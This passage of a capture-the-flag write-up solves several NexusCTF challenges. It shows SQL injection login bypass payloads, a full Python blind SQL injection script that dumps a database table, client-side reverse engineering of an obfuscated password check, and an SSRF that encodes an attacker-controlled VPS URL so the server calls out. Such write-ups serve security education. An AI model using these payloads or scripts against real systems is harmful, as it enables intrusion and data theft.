class="string">f&quot;[DONE] Not found in range. Tried ~<span class="subst">&#123;tried&#125;</span> attempts in <span class="subst">&#123;total_time:<span class="number">.2</span>f&#125;</span>s&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251003023406298.png" alt="image-20251003023406298"></p>
<p>Flag:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NexusCTF&#123;Swipe2unl0ckPls&#125;</span><br></pre></td></tr></table></figure>

<h3 id="UDPC-Intergalactic-Login-Portal"><a href="#UDPC-Intergalactic-Login-Portal" class="headerlink" title="UDPC Intergalactic Login Portal"></a>UDPC Intergalactic Login Portal</h3><p>I open the link and land on a login page.</p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251003024721868.png" alt="image-20251003024721868"></p>
<p> I first try common weak passwords and successfully log in with <code>admin:admin123</code>. However, the admin interface itself does not reveal anything useful.</p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251003024753439.png" alt="image-20251003024753439"></p>
<p>I then test for SQL injection by using the payload admin’+or+1&#x3D;1–+, which authenticates me — proving the login is vulnerable to SQL injection. What’s more, when I try the payload, I can get a series error like <code>no such function: sleep</code> or<code>near &quot;&#39;1&#39;&quot;: syntax error</code>, those errors indicate the backend is using SQLite.</p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251003025117374.png" alt="image-20251003025117374"></p>
<p> I verify this further with boolean-based checks (for example, testing <code>length(sqlite_version())&gt;1</code> returns true), confirming the presence of a blind SQL injection vector.</p>
<p>To extract data, I perform boolean blind extraction. For example, to test whether the first character of the admin password is a, I send:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=admin&#x27;+or+substr((select+password+from+users+where+username=&#x27;admin&#x27;),1,1)=&#x27;a&#x27;--+--+</span><br></pre></td></tr></table></figure>

<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251003030230618.png" alt="image-20251003030230618"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=admin&#x27;+or+substr((select+password+from+users+where+username=&#x27;admin&#x27;),1,1)=&#x27;c&#x27;--+--+</span><br></pre></td></tr></table></figure>

<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251003030255501.png" alt="image-20251003030255501"></p>
<p>I observe the response difference and iterate characters one-by-one. I automate this process with a Python script that uses binary search over printable ASCII to speed up extraction. The script enumerates rows in a target table and extracts each column value using SUBSTR(…) queries.</p>
<p>get two table <code>user</code> <code>sensitive_data</code></p>
<p>and kown there are 4 column in sensitive_data table, and dump the flag from sensitive_data’s column secret_notes:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">TARGET_URL = <span class="string">&quot;http://34.129.100.231:5050/login&quot;</span></span><br><span class="line">USERNAME = <span class="string">&quot;admin&quot;</span></span><br><span class="line">PARAM_NAME = <span class="string">&quot;password&quot;</span></span><br><span class="line">SUCCESS_INDICATOR = <span class="string">&quot;granted&quot;</span></span><br><span class="line">HEADERS = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">TIMEOUT = <span class="number">12</span></span><br><span class="line">DELAY = <span class="number">0.12</span></span><br><span class="line">MAX_CELL_LEN = <span class="number">120</span></span><br><span class="line">ASCII_MIN = <span class="number">32</span></span><br><span class="line">ASCII_MAX = <span class="number">126</span></span><br><span class="line">COLUMNS = [<span class="string">&quot;id&quot;</span>, <span class="string">&quot;secret_notes&quot;</span>]</span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_true</span>(<span class="params">payload</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;username&quot;</span>: USERNAME, PARAM_NAME: payload&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = sess.post(TARGET_URL, data=data, headers=HEADERS, timeout=TIMEOUT)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] request error:&quot;</span>, e)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> SUCCESS_INDICATOR <span class="keyword">in</span> (r.text <span class="keyword">or</span> <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exists_at_pos</span>(<span class="params">sql_expr, pos</span>):</span><br><span class="line">    payload = <span class="string">&quot;1&#x27; OR SUBSTR((&#123;sql&#125;),&#123;pos&#125;,1)!=&#x27;&#x27;--+&quot;</span>.<span class="built_in">format</span>(sql=sql_expr, pos=pos)</span><br><span class="line">    <span class="keyword">return</span> is_true(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">char_ge</span>(<span class="params">sql_expr, pos, code</span>):</span><br><span class="line">    ch = <span class="built_in">chr</span>(code)</span><br><span class="line">    payload = <span class="string">&quot;1&#x27; OR SUBSTR((&#123;sql&#125;),&#123;pos&#125;,1)&gt;=&#x27;&#123;ch&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(sql=sql_expr, pos=pos, ch=ch.replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&#x27;&#x27;&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> is_true(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">char_eq</span>(<span class="params">sql_expr, pos, ch</span>):</span><br><span class="line">    payload = <span class="string">&quot;1&#x27; OR SUBSTR((&#123;sql&#125;),&#123;pos&#125;,1)=&#x27;&#123;ch&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(sql=sql_expr, pos=pos, ch=ch.replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&#x27;&#x27;&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> is_true(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_cell</span>(<span class="params">sql_expr, max_len=MAX_CELL_LEN</span>):</span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_len+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> exists_at_pos(sql_expr, pos):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        low, high = ASCII_MIN, ASCII_MAX</span><br><span class="line">        <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> char_ge(sql_expr, pos, mid):</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid - <span class="number">1</span></span><br><span class="line">        ord_cand = low - <span class="number">1</span></span><br><span class="line">        ch = <span class="built_in">chr</span>(ord_cand)</span><br><span class="line">        <span class="keyword">if</span> char_eq(sql_expr, pos, ch):</span><br><span class="line">            s += ch</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    [+] pos <span class="subst">&#123;pos&#125;</span> -&gt; &#x27;<span class="subst">&#123;ch&#125;</span>&#x27;  (so far: <span class="subst">&#123;s&#125;</span>)&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            found = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">3</span>, <span class="number">4</span>):</span><br><span class="line">                code = ord_cand + d</span><br><span class="line">                <span class="keyword">if</span> code &lt; ASCII_MIN <span class="keyword">or</span> code &gt; ASCII_MAX:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> char_eq(sql_expr, pos, <span class="built_in">chr</span>(code)):</span><br><span class="line">                    s += <span class="built_in">chr</span>(code)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;    [+] pos <span class="subst">&#123;pos&#125;</span> -&gt; &#x27;<span class="subst">&#123;<span class="built_in">chr</span>(code)&#125;</span>&#x27;  (so far: <span class="subst">&#123;s&#125;</span>)&quot;</span>)</span><br><span class="line">                    found = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;    [-] can&#x27;t determine char at pos <span class="subst">&#123;pos&#125;</span>; stopping cell.&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        time.sleep(DELAY)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cell_sql_for</span>(<span class="params">table, column, row_offset</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;(SELECT CAST(&#123;col&#125; AS TEXT) FROM &#123;tbl&#125; LIMIT 1 OFFSET &#123;off&#125;)&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        col=column.replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&#x27;&#x27;&quot;</span>),</span><br><span class="line">        tbl=table.replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&#x27;&#x27;&quot;</span>),</span><br><span class="line">        off=row_offset</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_table</span>(<span class="params">table, columns</span>):</span><br><span class="line">    rows = []</span><br><span class="line">    row = <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Start dumping table:&quot;</span>, table)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Processing row offset <span class="subst">&#123;row&#125;</span> ...&quot;</span>)</span><br><span class="line">        first_sql = cell_sql_for(table, columns[<span class="number">0</span>], row)</span><br><span class="line">        first_val = extract_cell(first_sql)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> first_val:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] no value found for first column at this offset -&gt; assuming end of rows.&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        row_data = [first_val]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] row <span class="subst">&#123;row&#125;</span> col <span class="subst">&#123;columns[<span class="number">0</span>]&#125;</span> = <span class="subst">&#123;first_val&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> col <span class="keyword">in</span> columns[<span class="number">1</span>:]:</span><br><span class="line">            sql = cell_sql_for(table, col, row)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  [*] extracting column &#x27;<span class="subst">&#123;col&#125;</span>&#x27; ...&quot;</span>)</span><br><span class="line">            v = extract_cell(sql)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  [+] row <span class="subst">&#123;row&#125;</span> col <span class="subst">&#123;col&#125;</span> = <span class="subst">&#123;v&#125;</span>&quot;</span>)</span><br><span class="line">            row_data.append(v)</span><br><span class="line">        rows.append(row_data)</span><br><span class="line">        row += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> rows</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    table = <span class="string">&quot;sensitive_data&quot;</span></span><br><span class="line">    result = dump_table(table, COLUMNS)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n=== DUMP COMPLETE ===&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i, r <span class="keyword">in</span> <span class="built_in">enumerate</span>(result):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Row <span class="subst">&#123;i&#125;</span>:&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> colname, val <span class="keyword">in</span> <span class="built_in">zip</span>(COLUMNS, r):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  <span class="subst">&#123;colname&#125;</span>: <span class="subst">&#123;val&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>I run the script to enumerate rows in the sensitive_data table and extract the listed columns. The dump reveals the flag stored in that table.</p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251003032145952.png" alt="image-20251003032145952"></p>
<p>Flag:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NexusCTF&#123;interstellar_Heist&#125;</span><br></pre></td></tr></table></figure>

<h3 id="It’s-All-Coming-Together…"><a href="#It’s-All-Coming-Together…" class="headerlink" title="It’s All Coming Together…"></a>It’s All Coming Together…</h3><p>I open the challenge link and see a page asking me to enter a password:</p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251003070042115.png" alt="image-20251003070042115"></p>
<p>At first I think a dictionary brute-force will work, but when I capture the traffic with Burp I notice the requests do not contain the plaintext password I enter:</p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251003070438372.png" alt="image-20251003070438372"></p>
<p>That makes me suspect this is a frontend challenge — the password handling&#x2F;verification happens in the JavaScript. I search the bundled JS for keywords like flag, and I quickly find a relevant section where the result is rendered:</p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251003071019219.png" alt="image-20251003071019219"></p>
<p>Tracing this code I notice a few useful identifiers. In particular, H(o) looks like it holds the user-supplied password, and the final flag is constructed as:</p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251003071153286.png" alt="image-20251003071153286"></p>
<p>In other words, the user input is the flag, if I can make the client-side check accept it, the site will reveal the flag. The function <code>Ya</code> appears to be responsible for displaying the flag, so I locate <code>Ya</code> and then trace back to find the password validation logic in <code>Ua()</code>.</p>
<p>A critical click handler looks like this:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x.<span class="property">__click</span> = <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">                $(a, !<span class="number">0</span>),</span><br><span class="line">                $(r, !<span class="number">1</span>),</span><br><span class="line">                <span class="built_in">clearTimeout</span>(s),</span><br><span class="line">                <span class="keyword">await</span> <span class="title class_">Ua</span>(<span class="title function_">H</span>(o)) ? $(t, !<span class="number">0</span>) : ($(r, !<span class="number">0</span>),</span><br><span class="line">                s = <span class="built_in">setTimeout</span>( <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                    $(r, !<span class="number">1</span>)</span><br><span class="line">                &#125;</span><br><span class="line">                , <span class="number">2e3</span>)),</span><br><span class="line">                $(a, !<span class="number">1</span>)</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>I search for references to <code>Ua(</code> and locate the function. The code is deliberately obfuscated and contains many helper wrappers, which makes static reading confusing, so I switch to dynamic debugging in the browser devtools.</p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251003071815595.png" alt="image-20251003071815595"></p>
<p>I scroll down to the main loop in Ua() and set a breakpoint at the start of the function:</p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251003072126600.png" alt="image-20251003072126600"></p>
<p>I submit a test password, “123”, and step through the function line by line. The function quickly <code>returns !1</code> at a specific check:</p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251003072359320.png" alt="image-20251003072359320"></p>
<p>This is still fairly obfuscated, so I use console to print intermediate values while debugging. That helps me understand the logic better:</p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251003072550130.png" alt="image-20251003072550130"></p>
<p>From the debug output I discover the first requirement: the password must start with the prefix St@rsh1p. </p>
<p>I enter St@rsh1p and try again; the function still returns !1</p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251003072726957.png" alt="image-20251003072726957"></p>
<p>Stepping further, I find a comparison that fails here:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (R !== N.nd)</span><br></pre></td></tr></table></figure>

<p>N.nd is a constant defined elsewhere in the script; R is a value computed during validation. Right now R is 1, so the comparison fails. To understand why, I set a breakpoint at the top of Ua() and step through the code to see how R is computed and what parts of the input affect it.</p>
<p>After debugging, I find how R is derived. The relevant snippet looks like this:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> R = d[<span class="title function_">p</span>(-<span class="number">370</span>, -<span class="number">355</span>)];</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">k</span>(<span class="params">N, y</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">w</span>(N - -<span class="number">998</span>, y)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251003074327305.png" alt="image-20251003074327305"></p>
<p>To be honest, at first this is confusing, but by entering many different passwords to try and watching variables I discover the meaning: the array <code>d</code> contains the digits found in the password, and <code>R</code> is effectively the count of numeric characters in the input. For example, after I enter St@rsh1p1 the runtime shows:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d = [1, 1]</span><br><span class="line">R = 2</span><br></pre></td></tr></table></figure>

<p>So the condition if (R !&#x3D;&#x3D; N.nd) is checking that the password contains exactly N.nd digits — in this case N.nd equals 2. In other words, the password must contain two numeric characters. </p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251003074844422.png" alt="image-20251003074844422"></p>
<p>Continuing the trace, the code updates another value N[mew] from ‘St@rsh1p’ to ‘@R’ as the function iterates. I guess the validation also requires the password to contain the substring @R somewhere. I do not immediately return out of the loop at that point, so @R looks like a required substring rather than the final check.</p>
<p>Stepping further, I see N[mew] becomes the character ! and the code then checks whether the password ends with !. That means the next requirement is that the password must terminate with an exclamation mark.</p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251003075532702.png" alt="image-20251003075532702"></p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251003075615527.png" alt="image-20251003075615527"></p>
<p>I enter ‘St@rsh1p1!’ and continue stepping through the code.</p>
<p>The next checkpoint suggests the password must contain the substring ‘h1pst@r’:</p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251003080424946.png" alt="image-20251003080424946"></p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251003080549343.png" alt="image-20251003080549343"></p>
<p>update the password to ‘St@rsh1pst@r1!’ and try again. Execution stops at the following condition:</p>
<p>The execution then stops at this check:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (a[<span class="title function_">h</span>(<span class="number">1429</span>, n.<span class="property">laBoratory</span>)](l, N.<span class="property">sm</span>))</span><br><span class="line">                        <span class="keyword">return</span> !<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>Calling a[h(1429, n.laBoratory)] by itself does not immediately give a useful result</p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251003081004650.png" alt="image-20251003081004650"></p>
<p>but I notice the call’s arguments are (l, N.sm). From prior inspection N.sm is the character ‘6’, and at this moment <code>l</code> is ‘2’. I trace back to see how l is computed.</p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251003081140218.png" alt="image-20251003081140218"></p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251003081206423-20251003081208761.png" alt="image-20251003081206423"></p>
<p>l is produced by a function <code>reduce</code> over the array d (the digit array we observed earlier) — in other words, l is the sum of the numeric characters in the password. Therefore this condition is checking whether the sum of the digits equals N.sm (which is 6).</p>
<p>To satisfy this requirement I change the password so the digits sum to 6. For example, replacing the second 1 with 5 yields:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">St@rsh1pst@r5!</span><br></pre></td></tr></table></figure>

<p>Get it!</p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251003081406414.png" alt="image-20251003081406414"></p>
<p>I summarise the full set of client-side checks the password must satisfy:</p>
<ol>
<li><strong>Prefix</strong> — it starts with ‘St@rsh1p’.</li>
<li><strong>Digits count</strong> — it contains exactly ‘2’ numeric characters.</li>
<li><strong>Digits sum</strong> — the sum of all digits in the password equals ‘6’.</li>
<li><strong>Substring</strong> — it contains the substring ‘h1pst@r’ (appears after the prefix in the validation flow).</li>
<li><strong>Contains</strong> — it contains the substring ‘@R’ somewhere (observed during iteration).</li>
<li><strong>Suffix</strong> — it ends with ‘!’.</li>
</ol>
<p>Flag:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NexusCTF&#123;St@rsh1pst@r5!&#125;</span><br></pre></td></tr></table></figure>

<p>I really enjoy this challenge — kudos to the author for designing such a cleverly obfuscated frontend puzzle. The layered checks hidden inside Ua() are both frustrating and satisfying to unravel.</p>
<p>Honestly, the obfuscation makes my head spin at times 😵‍💫, but in the end that’s exactly what makes the challenge memorable and fun. Big respect to the creativity here!</p>
<h3 id="Some-Stars-Read-Fast"><a href="#Some-Stars-Read-Fast" class="headerlink" title="Some Stars Read Fast"></a>Some Stars Read Fast</h3><p><strong>Short summary</strong><br> The frontend constructs a token by triple-base64-encoding a Wikipedia URL (stripping <code>=</code> at each step) and prefixing it with <code>&quot;eyJ&quot;</code>. The app then calls <code>GET /api/v1/star/&lt;token&gt;/distance</code>. By replacing the embedded URL with one on my VPS and listening on the VPS network interface, I observed the server perform an outbound request and found the flag in the request headers.</p>
<p><strong>Key client JS</strong></p>
<p>These are the critical lines from the client that explain the token format and the fetch:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// inside click handler k(...)</span></span><br><span class="line"><span class="keyword">const</span> url = <span class="string">&quot;https://en.wikipedia.org/wiki/&quot;</span> + a.<span class="property">currentTarget</span>.<span class="property">textContent</span>.<span class="title function_">replaceAll</span>(<span class="string">&quot; &quot;</span>, <span class="string">&quot;_&quot;</span>);</span><br><span class="line"><span class="comment">// triple-base64, remove padding each step, then prefix &quot;eyJ&quot;</span></span><br><span class="line"><span class="keyword">const</span> r = <span class="string">&quot;eyJ&quot;</span> + <span class="title function_">btoa</span>(<span class="title function_">btoa</span>(<span class="title function_">btoa</span>(url)).<span class="title function_">replaceAll</span>(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)).<span class="title function_">replaceAll</span>(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)).<span class="title function_">replaceAll</span>(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="comment">// call the API</span></span><br><span class="line"><span class="title function_">x</span>(t).<span class="property">time</span> = <span class="keyword">await</span> (<span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`/api/v1/star/<span class="subst">$&#123;r&#125;</span>/distance`</span>)).<span class="title function_">text</span>();</span><br></pre></td></tr></table></figure>

<p>(So token &#x3D; <code>&quot;eyJ&quot; + strip_eq(b64(strip_eq(b64(strip_eq(b64(url))))))</code>.)</p>
<p><strong>Reproduction steps</strong></p>
<ol>
<li><p>On my public VPS I ran a simple listener to catch callbacks (optional; I used tcpdump ultimately):<br> <code>python3 -m http.server 80</code> or a small HTTP handler.</p>
</li>
<li><p>I built a token that encodes my VPS URL exactly like the client does (triple base64, strip <code>=</code> each layer, prefix <code>eyJ</code>). Example (Python pseudo-step):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pseudo</span></span><br><span class="line">url = <span class="string">&quot;http://&lt;vps_ip&gt;/&quot;</span></span><br><span class="line">step1 = base64.b64encode(url).decode().replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">step2 = base64.b64encode(step1.encode()).decode().replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">step3 = base64.b64encode(step2.encode()).decode().replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">token = <span class="string">&quot;eyJ&quot;</span> + step3</span><br></pre></td></tr></table></figure>
</li>
<li><p>I requested the target endpoint with that token:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/v1/star/&lt;token&gt;/distance</span><br></pre></td></tr></table></figure>

<p>I can get the http request:</p>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251010002752603.png" alt="image-20251010002752603"></p>
</li>
<li><p>On the VPS I tried <code>nc -l 80</code> first to catch incoming HTTP requests, but it showed nothing. I suspected <code>nc</code> was not receiving the request the way I expected (some servers open connections differently). <code>nc</code> can work for simple tests but can miss traffic or be closed early; it’s also easy to mis-use for HTTP with missing CRLFs.</p>
</li>
<li><p>I then used tcpdump to capture and print HTTP payloads on port 80 in real time:</p>
</li>
</ol>
